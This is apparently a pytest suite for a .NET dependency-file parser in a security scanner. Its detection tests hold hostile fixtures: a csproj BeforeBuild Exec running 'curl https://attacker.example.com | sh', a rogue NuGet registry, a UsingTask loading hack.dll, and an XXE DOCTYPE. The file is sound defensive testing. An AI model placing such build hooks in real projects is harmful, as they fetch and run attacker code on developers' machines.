"""REQ-15 — C# / .NET manifest + lock parser (Phase 7, TDD red).

Tests are written against the expected Phase 7 public API:

    from scarno.analysers.csharp.dep_file_parser import (
        parse_all_csharp_dependency_files,
    )

Covers:
  * ``<PackageReference>`` in ``.csproj`` / ``.fsproj`` / ``.vbproj``
  * Central Package Management via ``Directory.Packages.props``
  * Legacy ``packages.config`` (NuGet v2 format)
  * ``.sln`` multi-project discovery
  * ``packages.lock.json`` version resolution
  * ``nuget.config`` custom registry → Finding TS-SI-015
  * MSBuild ``<Exec>`` task → Finding TS-SI-016
  * MSBuild custom ``<UsingTask>`` → Finding TS-SI-017
"""
from __future__ import annotations

import json

import pytest

try:
    from scarno.analysers.csharp.dep_file_parser import (  # type: ignore[import-not-found]
        parse_all_csharp_dependency_files,
    )
    from scarno.findings.rules import RULES

    CSHARP_MANIFEST_AVAILABLE = True
except ImportError:
    parse_all_csharp_dependency_files = None  # type: ignore[assignment]
    RULES = {}  # type: ignore[assignment]
    CSHARP_MANIFEST_AVAILABLE = False

pytestmark = pytest.mark.skipif(
    not CSHARP_MANIFEST_AVAILABLE,
    reason="pending Phase 7 — scarno.analysers.csharp.dep_file_parser not yet implemented",
)


def _names(deps):
    return {d.name for d in deps}


def _version(deps, name):
    for d in deps:
        if d.name == name:
            return d.version
    return None


# ── REQ-15 — PackageReference ──────────────────────────────────────────────


class TestReq15PackageReference:
    @pytest.mark.requirement("FR-123")
    def test_csproj_package_reference_parsed(self, tmp_path):
        (tmp_path / "App.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <ItemGroup>\n'
            '    <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />\n'
            '    <PackageReference Include="Serilog" Version="3.1.1" />\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        deps, errors, _ = parse_all_csharp_dependency_files(str(tmp_path))
        assert errors == []
        assert _version(deps, "Newtonsoft.Json") == "13.0.3"
        assert _version(deps, "Serilog") == "3.1.1"

    @pytest.mark.requirement("FR-123")
    def test_fsproj_and_vbproj_also_parsed(self, tmp_path):
        (tmp_path / "LibF.fsproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <ItemGroup>\n'
            '    <PackageReference Include="FSharp.Core" Version="8.0.100" />\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        (tmp_path / "LibV.vbproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <ItemGroup>\n'
            '    <PackageReference Include="MSTest.TestAdapter" Version="3.0.0" />\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        deps, _, _ = parse_all_csharp_dependency_files(str(tmp_path))
        names = _names(deps)
        assert "FSharp.Core" in names
        assert "MSTest.TestAdapter" in names

    @pytest.mark.requirement("FR-123")
    def test_deps_tagged_ecosystem_nuget(self, tmp_path):
        (tmp_path / "App.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <ItemGroup>\n'
            '    <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        deps, _, _ = parse_all_csharp_dependency_files(str(tmp_path))
        assert deps
        assert all(d.ecosystem == "nuget" for d in deps)

    @pytest.mark.requirement("FR-123")
    def test_version_as_child_element(self, tmp_path):
        # Alternative schema: <PackageReference Include="X"><Version>…</Version></PackageReference>
        (tmp_path / "App.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <ItemGroup>\n'
            '    <PackageReference Include="Serilog">\n'
            '      <Version>3.1.1</Version>\n'
            '    </PackageReference>\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        deps, _, _ = parse_all_csharp_dependency_files(str(tmp_path))
        assert _version(deps, "Serilog") == "3.1.1"


# ── REQ-15 — Central Package Management ────────────────────────────────────


class TestReq15CentralPackageMgmt:
    @pytest.mark.requirement("FR-124")
    def test_directory_packages_props_resolves_versions(self, tmp_path):
        (tmp_path / "Directory.Packages.props").write_text(
            '<Project>\n'
            '  <PropertyGroup>\n'
            '    <ManagePackageVersionsCentrally>true</ManagePackageVersionsCentrally>\n'
            '  </PropertyGroup>\n'
            '  <ItemGroup>\n'
            '    <PackageVersion Include="Newtonsoft.Json" Version="13.0.3" />\n'
            '    <PackageVersion Include="Serilog" Version="3.1.1" />\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        (tmp_path / "App.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <ItemGroup>\n'
            '    <PackageReference Include="Newtonsoft.Json" />\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        deps, _, _ = parse_all_csharp_dependency_files(str(tmp_path))
        # Version resolved via central props
        assert _version(deps, "Newtonsoft.Json") == "13.0.3"

    @pytest.mark.requirement("FR-124")
    def test_csproj_override_beats_central_version(self, tmp_path):
        (tmp_path / "Directory.Packages.props").write_text(
            '<Project>\n'
            '  <ItemGroup>\n'
            '    <PackageVersion Include="Newtonsoft.Json" Version="13.0.3" />\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        (tmp_path / "App.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <ItemGroup>\n'
            '    <PackageReference Include="Newtonsoft.Json" VersionOverride="12.0.3" />\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        deps, _, _ = parse_all_csharp_dependency_files(str(tmp_path))
        assert _version(deps, "Newtonsoft.Json") == "12.0.3"


# ── REQ-15 — Legacy packages.config ────────────────────────────────────────


class TestReq15PackagesConfig:
    @pytest.mark.requirement("FR-125")
    def test_packages_config_parsed(self, tmp_path):
        (tmp_path / "packages.config").write_text(
            '<?xml version="1.0" encoding="utf-8"?>\n'
            '<packages>\n'
            '  <package id="Newtonsoft.Json" version="13.0.3" targetFramework="net48" />\n'
            '  <package id="log4net" version="2.0.15" targetFramework="net48" />\n'
            '</packages>\n'
        )
        deps, _, _ = parse_all_csharp_dependency_files(str(tmp_path))
        assert _version(deps, "Newtonsoft.Json") == "13.0.3"
        assert _version(deps, "log4net") == "2.0.15"

    @pytest.mark.requirement("FR-125")
    def test_packages_config_entities_rejected(self, tmp_path):
        """XXE defence: DOCTYPE must be refused pre-parse (SEC-NEW-03)."""
        (tmp_path / "packages.config").write_text(
            '<?xml version="1.0"?>\n'
            '<!DOCTYPE packages [ <!ENTITY x "y"> ]>\n'
            '<packages><package id="X" version="1.0" /></packages>\n'
        )
        deps, errors, _ = parse_all_csharp_dependency_files(str(tmp_path))
        assert deps == []
        assert any("doctype" in e.lower() or "entity" in e.lower() for e in errors)


# ── REQ-15 — Solution-file multi-project discovery ─────────────────────────


class TestReq15SolutionFileDiscovery:
    @pytest.mark.requirement("FR-126")
    def test_sln_discovers_all_referenced_projects(self, tmp_path):
        (tmp_path / "App.sln").write_text(
            'Microsoft Visual Studio Solution File, Format Version 12.00\n'
            'Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Api", '
            '"src\\Api\\Api.csproj", "{11111111-1111-1111-1111-111111111111}"\n'
            'EndProject\n'
            'Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Lib", '
            '"src\\Lib\\Lib.csproj", "{22222222-2222-2222-2222-222222222222}"\n'
            'EndProject\n'
        )
        api_dir = tmp_path / "src" / "Api"
        api_dir.mkdir(parents=True)
        (api_dir / "Api.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <ItemGroup>\n'
            '    <PackageReference Include="Swashbuckle" Version="6.5.0" />\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        lib_dir = tmp_path / "src" / "Lib"
        lib_dir.mkdir(parents=True)
        (lib_dir / "Lib.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <ItemGroup>\n'
            '    <PackageReference Include="Serilog" Version="3.1.1" />\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        deps, _, _ = parse_all_csharp_dependency_files(str(tmp_path))
        names = _names(deps)
        assert "Swashbuckle" in names
        assert "Serilog" in names


# ── REQ-15 — packages.lock.json ────────────────────────────────────────────


class TestReq15PackagesLockJson:
    @pytest.mark.requirement("FR-127")
    def test_lock_json_version_resolves_open_range(self, tmp_path):
        (tmp_path / "App.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <ItemGroup>\n'
            '    <PackageReference Include="Serilog" Version="[3.0.0,)" />\n'
            '  </ItemGroup>\n'
            '</Project>\n'
        )
        (tmp_path / "packages.lock.json").write_text(json.dumps({
            "version": 1,
            "dependencies": {
                "net8.0": {
                    "Serilog": {
                        "type": "Direct",
                        "requested": "[3.0.0, )",
                        "resolved": "3.1.1",
                        "contentHash": "abc",
                    }
                }
            },
        }))
        deps, _, _ = parse_all_csharp_dependency_files(str(tmp_path))
        assert _version(deps, "Serilog") == "3.1.1"


# ── REQ-15 — Security: nuget.config custom registry ────────────────────────


class TestReq15NugetConfigRegistry:
    @pytest.mark.requirement("SF-025")
    @pytest.mark.security
    def test_custom_registry_emits_ts_si_015(self, tmp_path):
        (tmp_path / "nuget.config").write_text(
            '<?xml version="1.0" encoding="utf-8"?>\n'
            '<configuration>\n'
            '  <packageSources>\n'
            '    <add key="internal" value="https://nuget.evil.example.com/v3/index.json" />\n'
            '  </packageSources>\n'
            '</configuration>\n'
        )
        _, _, findings = parse_all_csharp_dependency_files(str(tmp_path))
        assert any(f.rule_id == "TS-SI-015" for f in findings)

    @pytest.mark.requirement("SF-025")
    @pytest.mark.security
    def test_default_nuget_registry_does_not_fire(self, tmp_path):
        (tmp_path / "nuget.config").write_text(
            '<?xml version="1.0" encoding="utf-8"?>\n'
            '<configuration>\n'
            '  <packageSources>\n'
            '    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />\n'
            '  </packageSources>\n'
            '</configuration>\n'
        )
        _, _, findings = parse_all_csharp_dependency_files(str(tmp_path))
        assert not any(f.rule_id == "TS-SI-015" for f in findings)

    @pytest.mark.requirement("SF-025")
    @pytest.mark.security
    def test_ts_si_015_rule_exists(self):
        assert "TS-SI-015" in RULES


# ── REQ-15 — Security: MSBuild Exec task ───────────────────────────────────


class TestReq15MsbuildExecTask:
    @pytest.mark.requirement("SF-026")
    @pytest.mark.security
    def test_exec_task_in_csproj_emits_ts_si_016(self, tmp_path):
        (tmp_path / "App.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <Target Name="BeforeBuild">\n'
            '    <Exec Command="curl https://attacker.example.com | sh" />\n'
            '  </Target>\n'
            '</Project>\n'
        )
        _, _, findings = parse_all_csharp_dependency_files(str(tmp_path))
        assert any(f.rule_id == "TS-SI-016" for f in findings)

    @pytest.mark.requirement("SF-026")
    @pytest.mark.security
    def test_ts_si_016_rule_exists(self):
        assert "TS-SI-016" in RULES


# ── REQ-15 — Security: MSBuild custom UsingTask ────────────────────────────


class TestReq15MsbuildUsingTask:
    @pytest.mark.requirement("SF-027")
    @pytest.mark.security
    def test_custom_using_task_emits_ts_si_017(self, tmp_path):
        (tmp_path / "App.csproj").write_text(
            '<Project Sdk="Microsoft.NET.Sdk">\n'
            '  <UsingTask TaskName="Hack" AssemblyFile="C:\\tmp\\hack.dll" />\n'
            '</Project>\n'
        )
        _, _, findings = parse_all_csharp_dependency_files(str(tmp_path))
        assert any(f.rule_id == "TS-SI-017" for f in findings)

    @pytest.mark.requirement("SF-027")
    @pytest.mark.security
    def test_ts_si_017_rule_exists(self):
        assert "TS-SI-017" in RULES


# ── REQ-15 — Robustness ────────────────────────────────────────────────────


class TestReq15Robustness:
    @pytest.mark.requirement("FR-123")
    def test_missing_project_files_returns_empty(self, tmp_path):
        deps, errors, findings = parse_all_csharp_dependency_files(str(tmp_path))
        assert deps == []
        assert findings == []

    @pytest.mark.requirement("FR-123")
    def test_malformed_csproj_reports_error(self, tmp_path):
        (tmp_path / "App.csproj").write_text("<Project><not closed")
        deps, errors, _ = parse_all_csharp_dependency_files(str(tmp_path))
        assert deps == []
        assert errors
